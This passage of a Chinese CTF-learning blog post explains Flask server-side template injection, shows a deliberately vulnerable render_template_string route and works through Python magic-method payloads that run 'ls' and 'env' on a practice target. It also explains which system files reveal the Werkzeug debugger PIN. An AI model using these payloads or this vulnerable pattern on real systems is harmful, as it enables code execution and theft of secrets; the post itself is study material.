<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods = [<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">    html_str = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br></pre></td></tr></table></figure>

<p>第一个代码会被先渲染然后在return时模板引擎会将<code>&#123;&#123;str&#125;&#125;</code>替换为<code>str</code>变量的值，第二个代码直接将用户传入的参数值放入html_str中，然后经过模板渲染，直接输出显然这会造成恶意命令输入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/Users\23800\AppData\Roaming\Typora\typora-user-images\image-20240408212738405.png" alt="image-20240408212738405"></p>
<p>造成信息泄露</p>
<p>所以我们在检测是否存在SSTI时可以用数学运算来测验一下<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/18.png" alt="image-20240408213626676"></p>
<p>这是第一个代码下的web网页，此时整体被当作一个数据，而第二个代码则会算出结果</p>
<h3 id="确定模板引擎"><a href="#确定模板引擎" class="headerlink" title="确定模板引擎"></a>确定模板引擎</h3><p>各个模板引擎的语法是会有差异的，这些语法是专门为不与HTML字符冲突而选择的。有时无效的语法会返回错误信息，其中包含引擎类型或者版本（若遇到返回，搜索一下即可判断）</p>
<p>当然除此之外，我们以及可以注入数学运算来确定</p>
<p>Twig、Jinja2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; var1 + var2 &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Mako</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123; var1 + var2 &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Python沙盒逃逸（魔术方法）"><a href="#Python沙盒逃逸（魔术方法）" class="headerlink" title="Python沙盒逃逸（魔术方法）"></a>Python沙盒逃逸（魔术方法）</h3><p>在Jinja2中可以访问到Python的内置变量并且可以调用对应变量类型</p>
<p>Python的特性：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__class__ # 查找当前类型的所属对象</span><br><span class="line">__mro__ # 查找当前类对象的所有继承类</span><br><span class="line">__subclasses__ # 查找父类下的所有子类</span><br><span class="line">__globals__ # 函数会议字典的形式返回当前对象的全部全局变量</span><br><span class="line">__init__ # 查看类是否重载，重载是指程序在运行是就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载</span><br><span class="line">__base__ # 沿着父子类的关系往上走一个</span><br><span class="line"></span><br><span class="line">_builtin_ 内建函数，python中可以直接运行一些函数，例如int(),list()等等，这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)</span><br><span class="line"></span><br><span class="line"> ps：在py3中__builtin__被换成了builtin </span><br><span class="line"> __builtin__ 和 __builtins__之间是什么关系呢？</span><br><span class="line">在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。</span><br><span class="line">非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br></pre></td></tr></table></figure>

<p>基本的思路就是通过找到合适的魔术方法，一步步去执行，从而得到我们想要的结果（确实挺沙盒的）</p>
<p>这里提到了父类和子类，在Python中，可以使用类和继承来构建父类和子类的关系。父类是指在继承关系中被继承的类，而子类则是指继承父类的类。<strong>一个子类可以继承其父类的属性和方法，并且可以扩展或修改这些属性和方法。</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_sound</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_sound</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Woof!&quot;</span></span><br><span class="line"></span><br><span class="line">dog = Dog(<span class="string">&quot;Buddy&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(dog.name)  <span class="comment"># 输出：Buddy</span></span><br><span class="line"><span class="built_in">print</span>(dog.make_sound())  <span class="comment"># 输出：Woof!</span></span><br></pre></td></tr></table></figure>

<p>一眼丁真，这个例子非常清晰</p>
<p>我们来看看基本输入语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__</span><br><span class="line">#&#x27;&#x27;表示一个空字符串，&#x27;&#x27;.__class__将返回空字符串对象的类，即&lt;class &#x27;str&#x27;&gt;，表示字符串类</span><br><span class="line"></span><br><span class="line">[].__class__ 返回的是空列表对象的类，即 &lt;class &#x27;list&#x27;&gt;，表示列表类</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/19.png" alt="image-20240408233020140"></p>
<p>寻找基类</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/20.png" alt="image-20240408233126369"></p>
<p>两者都可以</p>
<p><strong>注：object是父子关系的顶端，所有的数据类型最终的父类都是object</strong></p>
<h4 id="常用payload及绕过"><a href="#常用payload及绕过" class="headerlink" title="常用payload及绕过"></a>常用payload及绕过</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51353029/article/details/111503731">SSTI入门详解-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">获取基本类的所有子类</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()</span><br><span class="line">读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用（python2）</span><br></pre></td></tr></table></figure>

<p>更多的我认为应根据题目来理解，这里我没完全搞明白就不写下去了，贴了链接来辅助理解</p>
<p>所以来道小题消化一下</p>
<h3 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="[Flask]SSTI"></a>[Flask]SSTI</h3><p>从源码中我看到变量是name，我们以此来构建payload</p>
<p>按照步骤，还是一样我们先用数学计算来检测是否存在注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/21.png" alt="image-20240409001931474"></p>
<p>很好</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/22.png" alt="image-20240409002745117"></p>
<p>通过class找到当前类</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/23.png" alt="image-20240409002824857"></p>
<p>找到基类</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/24.png" alt="image-20240409002101480"></p>
<p>源代码中我们找到很多子类</p>
<p>这里我们无法直接读取文件，因为不知道目标目录，所以我们要通过system函数去ls，这里就要通过调用os模块<strong>（在Python中，<code>os</code>模块是用于与操作系统进行交互的模块）</strong>以达到system的效果</p>
<p>此时我们用到子类80</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27%27.__class__.__base__.__subclasses__()[80]</span><br></pre></td></tr></table></figure>

<p>返回：&lt;class ‘_frozen_importlib_external._NamespacePath’&gt;</p>
<p>在Python中，命名空间路径（NamespacePath）是一种机制，用于管理模块的导入和查找。它帮助Python解释器定位并加载模块，从而使程序能够使用模块中定义的函数、类和变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()[80].__init__.__globals__ =&gt; __globals__</span><br></pre></td></tr></table></figure>

<p>__globals__是函数中的一个内置属性，以字典的形式返回当前空间的全局变量，而其中就能找到我们需要的目标模块”<strong>builtins</strong>“</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/25.png" alt="image-20240409011637885"></p>
<p>然而，并不是每个类的__init__都拥有__globals__属性，所以我们寻找的合适的类实际上就是__init__中拥有__globals__属性的类，可以通过脚本去遍历</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/26.png" alt="image-20240409005841270"></p>
<p>看来也并非一定是子类80，我们只是要的模块”<strong>builtins</strong>“来执行命令，至于是哪个子类就无所谓了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builtins个模块中有很多我们常用的内置函数和类，其中就有eval函数</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/27.png" alt="image-20240409012144463"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()[80].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)</span><br></pre></td></tr></table></figure>

<p><code>__import__</code>: 加载 os 模块。<br><code>popen()</code>: 执行一个 shell 以运行命令来开启一个进程，最后加个 <code>read()</code> 函数读取回显内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/28.png" alt="image-20240409012644666"></p>
<p>然而这里并没有flag，看了wp发现是再环境变量里，这我怎么都想不到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;%27%27.__class__.__base__.__subclasses__()[80].__init__.__globals__[%27__builtins__%27].eval(&quot;__import__(%27os%27).popen(%27env%27).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/29.png" alt="image-20240409013224203"></p>
<p>总结：这个SSTI够喝两壶的了。。。。。。</p>
<h2 id="Flask-PIN"><a href="#Flask-PIN" class="headerlink" title="Flask PIN"></a>Flask PIN</h2><p>Flask PIN码是一种安全措施，用于防止未授权访问Flask应用的调试器。当Flask应用以<strong>调试模式</strong>（Debug）运行时，PIN码可以作为一种保护机制，确保只有知道PIN码的用户才能访问交互式调试器。这是通过Werkzeug库实现的，Werkzeug是Flask的一个依赖项。</p>
<p>PIN码的生成依赖于多个因素，包括但不限于当前运行应用的<strong>用户名称（username）、应用的模块名（modname）、应用的名称（appname）、应用模块的文件路径（moddir）、当前网络接口的MAC地址的十进制数、UUID节点和机器ID</strong>。这些值通过特定的算法组合并进行哈希处理，生成一个9位的PIN码。</p>
<p>值得注意的是，PIN码并不是完全随机生成的，当同一程序重复运行时，生成的PIN码是相同的。但是，PIN码的生成算法可能会随着Werkzeug和Flask的不同版本而有所变化。例如，<strong>在Python 3.6版本中可能使用MD5加密算法，而在Python 3.8版本中可能使用SHA1加密算法。</strong></p>
<p>尽管PIN码提供了一定的安全层，但在生产环境中仍然不建议使用调试模式，因为错误的堆栈跟踪可能会暴露敏感信息。此外，如果攻击者能够访问到应用的调试器，他们可能尝试猜测或暴力破解PIN码。因此，开发人员应确保在生产环境中关闭调试模式，或者使用其他更安全的调试工具。</p>
<p>获取Flask PIN码的脚本底层逻辑基于对Flask和Werkzeug内部PIN码生成机制的理解。这个机制涉及到多个系统和应用级别的信息，这些信息被用来生成一个特定的哈希值，即PIN码。以下是获取PIN码的底层逻辑的关键步骤：</p>
<ol>
<li><p><strong>收集关键信息</strong>：脚本首先需要收集一系列关键信息，这些信息包括：</p>
<ul>
<li>当前运行应用的用户名（通常通过<code>getpass.getuser()</code>或读取<code>/etc/passwd</code>文件获得）。</li>
<li>应用的模块名（默认为<code>flask.app</code>）。</li>
<li>应用的名称（默认为<code>Flask</code>）。</li>
<li>Flask应用模块文件的路径（例如<code>/usr/local/lib/pythonX.X/site-packages/flask/app.py</code>）。</li>
<li>网络接口的MAC地址（通过读取<code>/sys/class/net/ethX/address</code>获得）。</li>
<li>系统的唯一标识符，即机器ID（可以通过多种方式获取，如<code>/etc/machine-id</code>、<code>/proc/sys/kernel/random/boot_id</code>等）。</li>
</ul>
</li>
<li><p><strong>哈希处理</strong>：收集到的信息被用作输入，通过特定的哈希算法（如MD5或SHA1）进行处理。这些信息被编码为字节串（如果它们是字符串），然后更新到哈希对象中。</p>
</li>
<li><p><strong>生成PIN码</strong>：哈希值用于生成PIN码。通常，哈希值的最后几位会被截取并格式化为9位数字（如果需要的话）。这个数字就是PIN码。</p>
</li>
<li><p><strong>考虑环境因素</strong>：在不同的环境下，如Docker容器，可能会有不同的机器ID获取方式。脚本需要根据当前环境调整获取机器ID的逻辑。</p>
</li>
<li><p><strong>版本兼容性</strong>：由于PIN码生成算法可能随着Werkzeug和Flask版本的不同而变化，脚本可能需要根据目标应用使用的版本来调整算法。</p>
</li>
<li><p><strong>输出PIN码</strong>：最终，脚本输出计算得到的PIN码，供用户在Flask调试器中使用。</p>
</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://quarter77.github.io">Qu4rt3r77</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://quarter77.github.io/undefined/bf39/">https://quarter77.github.io/undefined/bf39/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://quarter77.github.io" target="_blank">晚城的海岸线</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Python/">Python</a></div><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/undefined/46b9/" title="命令执行&amp;代码执行（完善中...）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">命令执行&amp;代码执行（完善中...）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Qu4rt3r77</div><div class="author-info__description">IT IS A LONG JOURNEY.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/quarter77" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">功能完善中... O.o</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python-Flask"><span class="toc-number">1.</span> <span class="toc-text">Python-Flask</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E8%AF%86Flask"><span class="toc-number">1.1.</span> <span class="toc-text">初识Flask</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask%E7%9A%84%E5%86%85%E6%A0%B8%EF%BC%9AWerkzeug-Jinja2"><span class="toc-number">1.1.1.</span> <span class="toc-text">Flask的内核：Werkzeug&amp;Jinja2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EFlask%E5%92%8CPHP"><span class="toc-number">1.1.2.</span> <span class="toc-text">关于Flask和PHP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">项目结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.3.</span> <span class="toc-text">Flask程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#app-run"><span class="toc-number">1.3.1.</span> <span class="toc-text">app.run()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.2.</span> <span class="toc-text">配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#route"><span class="toc-number">1.4.</span> <span class="toc-text">route()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E7%9A%84%E5%8F%98%E9%87%8F%E8%A7%84%E5%88%99"><span class="toc-number">1.4.1.</span> <span class="toc-text">路由的变量规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Request%E8%AF%B7%E6%B1%82"><span class="toc-number">1.4.2.</span> <span class="toc-text">Request请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0%E5%8F%82-%E9%87%8D%E5%AE%9A%E5%90%91-%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">传参&amp;重定向&amp;模板渲染</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#render-template-string"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">render_template_string</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95"><span class="toc-number">1.5.</span> <span class="toc-text">模板语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%8F%98%E9%87%8F%E7%9A%84%E5%80%BC"><span class="toc-number">1.5.1.</span> <span class="toc-text">显示变量的值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.5.2.</span> <span class="toc-text">控制结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF"><span class="toc-number">1.5.3.</span> <span class="toc-text">模板继承</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.5.4.</span> <span class="toc-text">包含模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.6.</span> <span class="toc-text">过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E4%B8%AA%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text">单个过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%8F%82%E6%95%B0%E7%9A%84%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text">带参数的过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AA%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.6.3.</span> <span class="toc-text">多个过滤器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EFlask%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">关于Flask的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-Session%E4%BC%AA%E9%80%A0"><span class="toc-number">2.1.</span> <span class="toc-text">Flask Session伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">2.1.1.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.</span> <span class="toc-text">Flask SSTI服务器端模板注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">确定是否存在模板注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">2.2.2.</span> <span class="toc-text">确定模板引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%88%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%89"><span class="toc-number">2.2.3.</span> <span class="toc-text">Python沙盒逃逸（魔术方法）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8payload%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">常用payload及绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-SSTI"><span class="toc-number">2.2.4.</span> <span class="toc-text">[Flask]SSTI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-PIN"><span class="toc-number">2.3.</span> <span class="toc-text">Flask PIN</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/undefined/bf39/" title="Python-Flask（完善中...）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python-Flask（完善中...）"/></a><div class="content"><a class="title" href="/undefined/bf39/" title="Python-Flask（完善中...）">Python-Flask（完善中...）</a><time datetime="2024-04-14T07:14:44.168Z" title="发表于 2024-04-14 15:14:44">2024-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/undefined/46b9/" title="命令执行&amp;代码执行（完善中...）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="命令执行&amp;代码执行（完善中...）"/></a><div class="content"><a class="title" href="/undefined/46b9/" title="命令执行&amp;代码执行（完善中...）">命令执行&amp;代码执行（完善中...）</a><time datetime="2024-04-14T07:12:51.431Z" title="发表于 2024-04-14 15:12:51">2024-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/undefined/f8b7/" title="SQL注入（完善中...）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入（完善中...）"/></a><div class="content"><a class="title" href="/undefined/f8b7/" title="SQL注入（完善中...）">SQL注入（完善中...）</a><time datetime="2024-04-14T06:05:13.517Z" title="发表于 2024-04-14 14:05:13">2024-04-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/3.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2024 By Qu4rt3r77</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script 